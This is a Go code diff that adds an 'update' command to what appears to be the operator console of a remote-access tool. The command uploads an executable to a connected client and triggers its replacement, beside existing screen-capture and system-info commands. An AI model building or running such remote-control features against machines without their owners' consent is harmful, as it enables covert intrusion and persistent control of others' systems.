@@ -183,6 +183,14 @@ func handleConsoleMode(input string, selectedID string) string {
 	case "publicip":
 		publicip(selectedID)
 		return ""
+	case "update":
+		if len(args) < 2 {
+			PrintError(T("usage_update"))
+			return ""
+		}
+		localPath := args[1]
+		updateClient(selectedID, localPath)
+		return ""
 	default:
 		PrintError(T("invalid_command"))
 		return ""
@@ -217,6 +225,7 @@ func printConsoleHelp() {
 		{Cmd: "systeminfo [fields...]", Desc: T("cmd_systeminfo_desc")},
 		{Cmd: "screencap [options]", Desc: T("cmd_screencap_desc")},
 		{Cmd: "publicip", Desc: T("cmd_publicip_desc")},
+		{Cmd: "update <local_executable>", Desc: T("cmd_update_desc")},
 		{Cmd: "back", Desc: T("cmd_back_desc")},
 		{Cmd: "help", Desc: T("cmd_help_desc")},
 		{Cmd: "exit", Desc: T("cmd_exit_desc")},
@@ -575,4 +584,42 @@ func printRawData(data map[string]interface{}) {
 		fmt.Printf("  %s: %v\n", key, value)
 	}
 	fmt.Println()
+}
+
+// updateClient uploads a new executable to the remote client and triggers a service update.
+func updateClient(id, localFilePath string) {
+	if id == "" {
+		PrintError(T("no_client_selected"))
+		return
+	}
+
+	if _, err := os.Stat(localFilePath); os.IsNotExist(err) {
+		PrintError(Tf("update_file_not_exist", localFilePath))
+		return
+	}
+
+	tempRemotePath := generateTempRemotePath(localFilePath)
+
+	PrintInfo(Tf("update_uploading", localFilePath))
+	uploadFile(id, localFilePath, tempRemotePath)
+
+	PrintInfo(Tf("update_starting", id))
+	sendUpdateCommand(id, tempRemotePath)
+}
+
+// sendUpdateCommand sends the service_update command to the remote client.
+func sendUpdateCommand(id, tempPath string) {
+	if !ensureClientManager() {
+		return
+	}
+	clientManager.UpdateClient(id, tempPath)
+}
+
+// generateTempRemotePath generates a temporary remote path for the update file.
+func generateTempRemotePath(localFilePath string) string {
+	ext := ""
+	if idx := strings.LastIndex(localFilePath, "."); idx != -1 {
+		ext = localFilePath[idx:]
+	}
+	return "/tmp/ratff_update_" + shared.GenerateID() + ext
 }
